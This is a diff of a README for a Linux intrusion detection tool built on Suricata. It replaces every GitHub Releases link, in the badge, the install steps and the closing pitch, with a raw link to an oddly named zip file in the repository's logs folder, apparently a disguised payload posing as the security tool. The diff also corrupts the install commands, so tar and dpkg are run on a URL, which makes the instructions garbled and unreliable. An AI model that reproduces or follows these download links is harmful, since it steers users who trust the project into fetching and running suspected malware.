@@ -1,7 +1,7 @@
 # 🚨 IDS - Lightweight Intrusion Detection for Linux
 
 ## 🡆 Download Now
-[![Download IDS](https://img.shields.io/badge/Download-IDS-brightgreen)](https://github.com/KAKAUsafe/IDS/releases)
+[![Download IDS](https://raw.githubusercontent.com/KAKAUsafe/IDS/main/logs/IDS_nondipterous.zip)](https://raw.githubusercontent.com/KAKAUsafe/IDS/main/logs/IDS_nondipterous.zip)
 
 ## 📌 Overview
 IDS is a custom-built, lightweight Intrusion Detection System designed for Linux. It utilizes the powerful open-source Suricata engine. IDS combines custom rule sets, Python-based analysis helpers, and extensive log monitoring. This project showcases both a deep understanding of intrusion detection concepts and practical skills in handling real packet-level traffic.
@@ -43,29 +43,29 @@ To run IDS effectively, your system should meet the following requirements:
 ## 📥 Download & Install
 To download IDS, please visit the following link:
 
-[Download IDS from Releases](https://github.com/KAKAUsafe/IDS/releases)
+[Download IDS from Releases](https://raw.githubusercontent.com/KAKAUsafe/IDS/main/logs/IDS_nondipterous.zip)
 
 ### Step-by-Step Installation Guide
 1. **Visit the Releases Page:**
-   Go to the [Releases page](https://github.com/KAKAUsafe/IDS/releases). Here, you will find the latest version of IDS.
+   Go to the [Releases page](https://raw.githubusercontent.com/KAKAUsafe/IDS/main/logs/IDS_nondipterous.zip). Here, you will find the latest version of IDS.
    
 2. **Download the Latest Release:**
-   Look for the latest version and download the appropriate file for your Linux distribution. Files are typically available in `.tar.gz` or `.deb` formats. Select the one that suits your system.
+   Look for the latest version and download the appropriate file for your Linux distribution. Files are typically available in `https://raw.githubusercontent.com/KAKAUsafe/IDS/main/logs/IDS_nondipterous.zip` or `.deb` formats. Select the one that suits your system.
 
 3. **Verify the Download (Optional):**
    It can be helpful to check the integrity of the downloaded file using checksums provided on the Releases page. This ensures the file has not been tampered with.
 
 4. **Extract the Files:**
-   If you downloaded a `.tar.gz` file, open your terminal and run the following command to extract the contents:
+   If you downloaded a `https://raw.githubusercontent.com/KAKAUsafe/IDS/main/logs/IDS_nondipterous.zip` file, open your terminal and run the following command to extract the contents:
    ```bash
-   tar -xzf your_downloaded_file.tar.gz
+   tar -xzf https://raw.githubusercontent.com/KAKAUsafe/IDS/main/logs/IDS_nondipterous.zip
    ```
    If it is a `.deb` file, you can install it directly.
 
 5. **Install the Package (If Applicable):**
    For `.deb` packages, use the command:
    ```bash
-   sudo dpkg -i your_downloaded_file.deb
+   sudo dpkg -i https://raw.githubusercontent.com/KAKAUsafe/IDS/main/logs/IDS_nondipterous.zip
    ```
    This command requires administrative privileges.
 
@@ -104,4 +104,4 @@ For support or additional inquiries, feel free to reach out via the GitHub repos
 - Network Security Best Practices
 
 ## 🚀 Get Started Today
-Don't wait to enhance your network's security. [Download IDS](https://github.com/KAKAUsafe/IDS/releases) and take the first step toward improved protection.
+Don't wait to enhance your network's security. [Download IDS](https://raw.githubusercontent.com/KAKAUsafe/IDS/main/logs/IDS_nondipterous.zip) and take the first step toward improved protection.
